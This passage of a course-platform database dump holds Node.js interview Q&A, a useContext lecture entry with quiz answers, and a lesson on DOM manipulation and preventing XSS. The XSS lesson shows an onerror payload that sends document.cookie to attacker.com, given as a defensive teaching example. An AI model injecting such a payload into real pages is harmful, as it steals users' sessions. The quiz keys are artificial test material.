Q3: How does Buffer.concat(body).toString() work, and how does URLSearchParams convert \\"username=Prashant+Jain&gender=male\\" into a JS object?", "answer": "Each chunk pushed into the body array during \\"data\\" events is a binary Buffer instance. Buffer.concat(body) merges all those Buffer instances into a single contiguous Buffer, and .toString() decodes the UTF-8 bytes into a URL-encoded string (\\"username=Prashant+Jain&gender=male\\"). Passing that string to new URLSearchParams(fullBody) parses the key=value pairs and decodes \\"+\\" / \\"%20\\" into spaces, and Object.fromEntries(params) converts those [key, value] entries into a plain object { username: \\"Prashant Jain\\", gender: \\"male\\" }.", "platform": "Technical Interview QA", "problemId": "5-q3", "difficulty": "Medium", "description": "Each chunk pushed into the body array during \\"data\\" events is a binary Buffer instance. Buffer.concat(body) merges all those Buffer instances into a single contiguous Buffer, and .toString() decodes the UTF-8 bytes into a URL-encoded string (\\"username=Prashant+Jain&gender=male\\"). Passing that string to new URLSearchParams(fullBody) parses the key=value pairs and decodes \\"+\\" / \\"%20\\" into spaces, and Object.fromEntries(params) converts those [key, value] entries into a plain object { username: \\"Prashant Jain\\", gender: \\"male\\" }."}, {"id": "node-lec-5-q4", "url": null, "link": null, "name": "Q4: What are the 4 types of Streams in Node.js?", "title": "Q4: What are the 4 types of Streams in Node.js?", "answer": "1) Readable Streams: Streams from which data can be read (e.g., http.IncomingMessage req, fs.createReadStream). 2) Writable Streams: Streams to which data can be written (e.g., http.ServerResponse res, fs.createWriteStream). 3) Duplex Streams: Streams that are both Readable and Writable simultaneously (e.g., TCP net.Socket). 4) Transform Streams: Duplex streams that modify or transform data as it passes through (e.g., zlib.createGzip compression).", "platform": "Technical Interview QA", "problemId": "5-q4", "difficulty": "Medium", "description": "1) Readable Streams: Streams from which data can be read (e.g., http.IncomingMessage req, fs.createReadStream). 2) Writable Streams: Streams to which data can be written (e.g., http.ServerResponse res, fs.createWriteStream). 3) Duplex Streams: Streams that are both Readable and Writable simultaneously (e.g., TCP net.Socket). 4) Transform Streams: Duplex streams that modify or transform data as it passes through (e.g., zlib.createGzip compression)."}, {"id": "node-lec-5-q5", "url": null, "link": null, "name": "Q5: What is the difference between module.exports and exports in Node.js CommonJS modules?", "title": "Q5: What is the difference between module.exports and exports in Node.js CommonJS modules?", "answer": "In every CommonJS file, module.exports is the actual object returned by require(). The variable exports is simply a shorthand reference pointer initialized to point to module.exports (let exports = module.exports). If you attach properties via exports.handler = fn, it works because it mutates the shared object. However, if you reassign exports = fn directly, you break the reference to module.exports, and require() will return an empty object {}! Therefore, always use module.exports = ... when exporting a single function or object.", "platform": "Technical Interview QA", "problemId": "5-q5", "difficulty": "Hard", "description": "In every CommonJS file, module.exports is the actual object returned by require(). The variable exports is simply a shorthand reference pointer initialized to point to module.exports (let exports = module.exports). If you attach properties via exports.handler = fn, it works because it mutates the shared object. However, if you reassign exports = fn directly, you break the reference to module.exports, and require() will return an empty object {}! Therefore, always use module.exports = ... when exporting a single function or object."}, {"id": "node-lec-5-q6", "url": null, "link": null, "name": "Q6: Where are Node.js Buffer instances allocated in memory?", "title": "Q6: Where are Node.js Buffer instances allocated in memory?", "answer": "Buffer instances represent fixed-length sequences of raw binary bytes and are allocated in C++ memory outside the V8 JavaScript Heap (though backed by ArrayBuffer references), allowing Node.js to manipulate binary network packets and file streams directly without V8 string encoding overhead.", "platform": "Technical Interview QA", "problemId": "5-q6", "difficulty": "Hard", "description": "Buffer instances represent fixed-length sequences of raw binary bytes and are allocated in C++ memory outside the V8 JavaScript Heap (though backed by ArrayBuffer references), allowing Node.js to manipulate binary network packets and file streams directly without V8 string encoding overhead."}]	https://nodejs.org/api/buffer.html	\N	\N	\N
22320	Learn useContext In 13 Minutes	usecontext-hook-deep-dive	Deep dive architectural lecture focusing on the mechanics, use cases, and anti-patterns of the useContext hook.	2026-10-12 02:05:09.516212+05:30	### 🎯 Engineering Guide: Learn useContext In 13 Minutes\nPart of the **Advanced React Hooks** curriculum designed for modern software development.\n\n- **Core Concepts**: Architectural patterns, modular design principles, and production best practices.\n- **Hands-on Objective**: Understand the lifecycle, error boundaries, and integration points with the rest of the application stack.\n- **Production Checklist**:\n  - Clean separation of concerns (controller, service, repository layers).\n  - Robust error handling and structured logging.\n  - Unit and integration testing considerations.	[{"url": "https://developer.mozilla.org/", "title": "MDN Web Docs"}, {"url": "https://devdocs.io/", "title": "Official Documentation & API Reference"}]	[{"url": "https://youtu.be/5LrDIWkK_Bc", "title": "Learn useContext In 13 Minutes", "creator_name": "Web Dev Simplified", "duration_minutes": 13, "creator_channel_url": "https://www.youtube.com/@WebDevSimplified"}]	[{"id": 1, "type": "multiple_choice", "answer": "C", "options": ["State mutation errors", "Memory leaks in useEffect", "Prop drilling across deeply nested components", "DOM event bubbling"], "question": "What major React architectural problem does `useContext` solve?", "explanation": "Context allows you to share state globally across the component tree without manually passing props through intermediate layers.", "correctAnswer": "C", "correct_index": 2, "correct_answer": "Prop drilling across deeply nested components"}, {"id": 2, "type": "multiple_choice", "answer": "C", "options": ["It only updates if its props change", "It is forcibly unmounted", "It automatically re-renders with the latest context value", "It requires a manual state update to reflect changes"], "question": "What happens to a component using `useContext` when the Provider's value changes?", "explanation": "Any component that consumes a context via `useContext` will immediately re-render whenever the `value` prop of the closest `<Provider>` changes.", "correctAnswer": "C", "correct_index": 2, "correct_answer": "It automatically re-renders with the latest context value"}, {"id": 3, "type": "multiple_choice", "answer": "B", "options": ["`createContext` and `useReducer`", "`createContext` and the `<Context.Provider>` wrapper", "`createProvider` and `useGlobalState`", "`createStore` and `<Provider>`"], "question": "Which two functions are essential for setting up Context in React?", "explanation": "You first instantiate the context object with `createContext()`, and then wrap your component tree with its `.Provider`.", "correctAnswer": "B", "correct_index": 1, "correct_answer": "`createContext` and the `<Context.Provider>` wrapper"}]	\N	> **Architectural Deep Dive:** This lecture covers the strict technical nuances, reconciliation behavior, and performance implications of using useContext in production environments. Pay special attention to concurrent rendering behaviors in React 18+.	Web Dev Simplified	https://www.youtube.com/@WebDevSimplified	\N	Learn useContext In 13 Minutes	Deep dive architectural lecture focusing on the mechanics, use cases, and anti-patterns of the useContext hook.	13	Easy	Core Hooks & API	5	[]	\N	13	https://youtu.be/5LrDIWkK_Bc	Learn useContext In 13 Minutes
22132	Lecture 14: DOM CRUD Operations & XSS Security — createElement, append, classList & Preventing Cross-Site Scripting	js-lecture-14-dom-crud-operations-createelement-xss-security	Dynamically create, insert, update, and remove DOM elements, manage attributes and CSS classes with classList, and prevent Cross-Site Scripting (XSS) vulnerabilities caused by innerHTML.	2026-10-06 21:36:53.504856+05:30	### 📌 Topic Overview\nBuilding dynamic web applications requires full **CRUD (Create, Read, Update, Delete)** control over DOM nodes at runtime—along with a deep understanding of **Cross-Site Scripting (XSS)** security so user-submitted data (like comments or profile names) cannot execute malicious JavaScript in other users' browsers.\n\n### 💡 Creating & Inserting DOM Elements\n* **`document.createElement("tag")`:** Allocates a new detached DOM element node in memory (e.g., `const h2 = document.createElement("h2")`).\n* **Modern Insertion Methods:**\n  * **`parent.append(...nodesOrStrings)`:** Appends one or more elements or text strings as the **last** children of `parent`.\n  * **`parent.prepend(...nodesOrStrings)`:** Inserts as the **first** children of `parent`.\n  * **`element.before(...nodes)` & `element.after(...nodes)`:** Inserts sibling elements immediately before or after `element`.\n  * **Legacy `parent.appendChild(node)`:** Only accepts a single `Node` object (rejects plain strings) and returns the appended node.\n\n### 💡 Managing Attributes, Classes & Deleting Elements\n* **Attributes:** `el.getAttribute("href")`, `el.setAttribute("data-id", "101")`, `el.removeAttribute("disabled")`.\n* **`el.classList` API:** Prefer `el.classList.add("active")`, `.remove("active")`, `.toggle("dark-mode")`, and `.contains("active")` over overwriting `el.className` directly.\n* **Removing Elements:** Call **`el.remove()`** directly on the element (or legacy `parent.removeChild(el)`).\n\n### 💡 Critical Security: Why `innerHTML` Causes XSS (Cross-Site Scripting)\n* Suppose a user submits a comment on your app containing:\n  `<img src="invalid.jpg" onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">`\n* If you render that comment into the DOM using **`commentBox.innerHTML = userComment`**, the browser parses the `<img>` tag, fails to load `invalid.jpg`, and **executes the attacker's JavaScript inside every viewer's browser**—stealing their session cookies or tokens!\n* **Defense Rule:** **Always use `el.textContent = userComment`** for user-generated content so the browser renders it as inert literal text without ever executing embedded HTML/scripts.\n\n### 🛠️ Code Examples: Safe DOM CRUD & Class Management\n```javascript\n// 1. Create, Configure, and Insert a New Element Safely\nconst parentList = document.getElementById("course-list");\nconst newItem = document.createElement("li");\n\nnewItem.textContent = "MERN Stack & System Design"; // Safe against XSS!\nnewItem.classList.add("course-card", "highlighted");\nnewItem.setAttribute("data-course-id", "mern-101");\n\nparentList.append(newItem); // Appends at the end of #course-list\n\n// 2. Insert Before/After a Specific Sibling & Remove an Element\nconst firstItem = parentList.firstElementChild;\nconst banner = document.createElement("div");\nbanner.textContent = "New Batch Starting Soon!";\nfirstItem.before(banner);\n\n// Delete an element from the DOM:\n// banner.remove();\n```	[{"url": "https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement", "link": "https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement", "title": "MDN Web Docs — Document.createElement() & DOM Manipulation"}]	[{"url": "http://www.youtube.com/watch?v=2jVOkYiAl2s", "title": "CRUD Operation in DOM | The Document Object Model (DOM) Explained | Javascript Full Course #14", "duration": "54m", "creator_name": "Coder Army", "creator_channel_url": "https://www.youtube.com/@CoderArmy9"}]	[{"id": "js-lec-14-q1", "url": null, "link": null, "name": "Q1: How can using element.innerHTML with user-submitted input lead to an XSS (Cross-Site Scripting) attack, and how do you prevent it?", "title": "Q1: How can using element.innerHTML with user-submitted input lead to an XSS (Cross-Site Scripting) attack, and how do you prevent it?", "answer": "When you assign a string to innerHTML, the browser's HTML parser creates real DOM elements from any tags in the string. Even though HTML5 blocks plain <script> tags inserted via innerHTML from running, attackers bypass this using event handler attributes like <img src=\\"x\\" onerror=\\"maliciousCode()\\">. When the image fails to load, the onerror JS executes with full access to the victim's localStorage, session tokens, and DOM. To prevent XSS, always assign untrusted user strings using element.textContent (or document.createTextNode()), which escapes < and > as plain text.", "platform": "Technical Interview QA", "problemId": "14-q1", "difficulty": "Hard", "description": "When you assign a string to innerHTML, the browser's HTML parser creates real DOM elements from any tags in the string. Even though HTML5 blocks plain <script> tags inserted via innerHTML from running, attackers bypass this using event handler attributes like <img src=\\"x\\" onerror=\\"maliciousCode()\\">. When the image fails to load, the onerror JS executes with full access to the victim's localStorage, session tokens, and DOM. To prevent XSS, always assign untrusted user strings using element.textContent (or document.createTextNode()), which escapes < and > as plain text."}, {"id": "js-lec-14-q2", "url": null, "link": null, "name": "Q2: What are the differences between parent.append() and parent.appendChild()?", "title": "Q2: What are the differences between parent.append() and parent.appendChild()?", "answer": "1) Arguments: append() can accept multiple Node objects AND plain DOMStrings at once (e.g., div.append(span1, \\"Hello\\", span2)), whereas appendChild() accepts only a single Node object (passing a string throws a TypeError). 2) Return value: append() returns undefined, while appendChild() returns the appended Node reference.", "platform": "Technical Interview QA", "problemId": "14-q2", "difficulty": "Easy", "description": "1) Arguments: append() can accept multiple Node objects AND plain DOMStrings at once (e.g., div.append(span1, \\"Hello\\", span2)), whereas appendChild() accepts only a single Node object (passing a string throws a TypeError). 2) Return value: append() returns undefined, while appendChild() returns the appended Node reference."}, {"id": "js-lec-14-q3", "url": null, "link": null, "name": "Q3: Why is el.classList.add(\\"active\\") preferred over el.className = \\"active\\"?", "title": "Q3: Why is el.classList.add(\\"active\\") preferred over el.className = \\"active\\"?", "answer": "Setting el.className = \\"active\\" completely overwrites and wipes out any existing CSS classes already attached to the element (such as \\"btn btn-primary\\"). Using el.classList.add(\\"active\\"), .remove(\\"active\\"), or .toggle(\\"active\\") adds or removes individual classes cleanly without disturbing the element's other classes.", "platform": "Technical Interview QA", "problemId": "14-q3", "difficulty": "Easy", "description": "Setting el.className = \\"active\\" completely overwrites and wipes out any existing CSS classes already attached to the element (such as \\"btn btn-primary\\"). Using el.classList.add(\\"active\\"), .remove(\\"active\\"), or .toggle(\\"active\\") adds or removes individual classes cleanly without disturbing the element's other classes."}, {"id": "js-lec-14-q4", "url": null, "link": null, "name": "Q4: If you need to append 1,000 list items (<li>) to a <ul>, why is calling ul.append(li) 1,000 times inside a loop bad for performance, and how do you optimize it?", "title": "Q4: If you need to append 1,000 list items (<li>) to a <ul>, why is calling ul.append(li) 1,000 times inside a loop bad for performance, and how do you optimize it?", "answer": "Touching the live DOM inside a 1,000-iteration loop can trigger repeated layout recalculations (Reflows) and Repaints. Instead, create an offscreen lightweight container using const fragment = document.createDocumentFragment() (or build the nodes in a detached container), append all 1,000 <li> elements to the fragment in memory, and then call ul.append(fragment) ONCE at the end—triggering only a single DOM reflow!", "platform": "Technical Interview QA", "problemId": "14-q4", "difficulty": "Medium", "description": "Touching the live DOM inside a 1,000-iteration loop can trigger repeated layout recalculations (Reflows) and Repaints. Instead, create an offscreen lightweight container using const fragment = document.createDocumentFragment() (or build the nodes in a detached container), append all 1,000 <li> elements to the fragment in memory, and then call ul.append(fragment) ONCE at the end—triggering only a single DOM reflow!"}, {"id": "js-lec-14-q5", "url": null, "link": null, "name": "Q5: Why do <script> tags placed inside <head> without defer fail to select body elements (returning null), and what is the difference between async and defer?", "title": "Q5: Why do <script> tags placed inside <head> without defer fail to select body elements (returning null), and what is the difference between async and defer?", "answer": "When the browser encounters a regular <script> in <head>, it pauses HTML parsing and runs the script before the <body> tags even exist in the DOM—so document.getElementById() returns null. Adding defer downloads the script in parallel with HTML parsing and guarantees execution ONLY after the entire HTML document has been parsed into the DOM (and in exact script order). async also downloads in parallel but executes immediately as soon as the download finishes, potentially before the DOM is ready and out of order.", "platform": "Technical Interview QA", "problemId": "14-q5", "difficulty": "Medium", "description": "When the browser encounters a regular <script> in <head>, it pauses HTML parsing and runs the script before the <body> tags even exist in the DOM—so document.getElementById() returns null. Adding defer downloads the script in parallel with HTML parsing and guarantees execution ONLY after the entire HTML document has been parsed into the DOM (and in exact script order). async also downloads in parallel but executes immediately as soon as the download finishes, potentially before the DOM is ready and out of order."}, {"id": "js-lec-14-q6", "url": null, "link": null, "name": "Q6: What happens if you call parent2.append(existingNode) when existingNode is already inside parent1 in the DOM?", "title": "Q6: What happens if you call parent2.append(existingNode) when existingNode is already inside parent1 in the DOM?", "answer": "A single DOM node reference can only exist in one place in the DOM tree at a time. Calling parent2.append(existingNode) automatically removes existingNode from parent1 and moves it into parent2—it does NOT clone the node! If you want a duplicate copy in both places, use existingNode.cloneNode(true).", "platform": "Technical Interview QA", "problemId": "14-q6", "difficulty": "Medium", "description": "A single DOM node reference can only exist in one place in the DOM tree at a time. Calling parent2.append(existingNode) automatically removes existingNode from parent1 and moves it into parent2—it does NOT clone the node! If you want a duplicate copy in both places, use existingNode.cloneNode(true)."}]	\N	### 📌 Topic Overview\nBuilding dynamic web applications requires full **CRUD (Create, Read, Update, Delete)** control over DOM nodes at runtime—along with a deep understanding of **Cross-Site Scripting (XSS)** security so user-submitted data (like comments or profile names) cannot execute malicious JavaScript in other users' browsers.\n\n### 💡 Creating & Inserting DOM Elements\n* **`document.createElement("tag")`:** Allocates a new detached DOM element node in memory (e.g., `const h2 = document.createElement("h2")`).\n* **Modern Insertion Methods:**\n  * **`parent.append(...nodesOrStrings)`:** Appends one or more elements or text strings as the **last** children of `parent`.\n  * **`parent.prepend(...nodesOrStrings)`:** Inserts as the **first** children of `parent`.\n  * **`element.before(...nodes)` & `element.after(...nodes)`:** Inserts sibling elements immediately before or after `element`.\n  * **Legacy `parent.appendChild(node)`:** Only accepts a single `Node` object (rejects plain strings) and returns the appended node.\n\n### 💡 Managing Attributes, Classes & Deleting Elements\n* **Attributes:** `el.getAttribute("href")`, `el.setAttribute("data-id", "101")`, `el.removeAttribute("disabled")`.\n* **`el.classList` API:** Prefer `el.classList.add("active")`, `.remove("active")`, `.toggle("dark-mode")`, and `.contains("active")` over overwriting `el.className` directly.\n* **Removing Elements:** Call **`el.remove()`** directly on the element (or legacy `parent.removeChild(el)`).\n\n### 💡 Critical Security: Why `innerHTML` Causes XSS (Cross-Site Scripting)\n* Suppose a user submits a comment on your app containing:\n  `<img src="invalid.jpg" onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">`\n* If you render that comment into the DOM using **`commentBox.innerHTML = userComment`**, the browser parses the `<img>` tag, fails to load `invalid.jpg`, and **executes the attacker's JavaScript inside every viewer's browser**—stealing their session cookies or tokens!\n* **Defense Rule:** **Always use `el.textContent = userComment`** for user-generated content so the browser renders it as inert literal text without ever executing embedded HTML/scripts.\n\n### 🛠️ Code Examples: Safe DOM CRUD & Class Management\n```javascript\n// 1. Create, Configure, and Insert a New Element Safely\nconst parentList = document.getElementById("course-list");\nconst newItem = document.createElement("li");\n\nnewItem.textContent = "MERN Stack & System Design"; // Safe against XSS!\nnewItem.classList.add("course-card", "highlighted");\nnewItem.setAttribute("data-course-id", "mern-101");\n\nparentList.append(newItem); // Appends at the end of #course-list\n\n// 2. Insert Before/After a Specific Sibling & Remove an Element\nconst firstItem = parentList.firstElementChild;\nconst banner = document.createElement("div");\nbanner.textContent = "New Batch Starting Soon!";\nfirstItem.before(banner);\n\n// Delete an element from the DOM:\n// banner.remove();\n```	Coder Army	https://www.youtube.com/@CoderArmy9	708	Lecture 14: DOM CRUD Operations & XSS Security — createElement, append, classList & Preventing Cross-Site Scripting	Dynamically create, insert, update, and remove DOM elements, manage attributes and CSS classes with classList, and prevent Cross-Site Scripting (XSS) vulnerabilities caused by innerHTML.	20	Easy	\N	14	[{"id": "js-lec-14-q1", "url": null, "link": null, "name": "Q1: How can using element.innerHTML with user-submitted input lead to an XSS (Cross-Site Scripting) attack, and how do you prevent it?", "title": "Q1: How can using element.innerHTML with user-submitted input lead to an XSS (Cross-Site Scripting) attack, and how do you prevent it?", "answer": "When you assign a string to innerHTML, the browser's HTML parser creates real DOM elements from any tags in the string. Even though HTML5 blocks plain <script> tags inserted via innerHTML from running, attackers bypass this using event handler attributes like <img src=\\"x\\" onerror=\\"maliciousCode()\\">. When the image fails to load, the onerror JS executes with full access to the victim's localStorage, session tokens, and DOM. To prevent XSS, always assign untrusted user strings using element.textContent (or document.createTextNode()), which escapes < and > as plain text.", "platform": "Technical Interview QA", "problemId": "14-q1", "difficulty": "Hard", "description": "When you assign a string to innerHTML, the browser's HTML parser creates real DOM elements from any 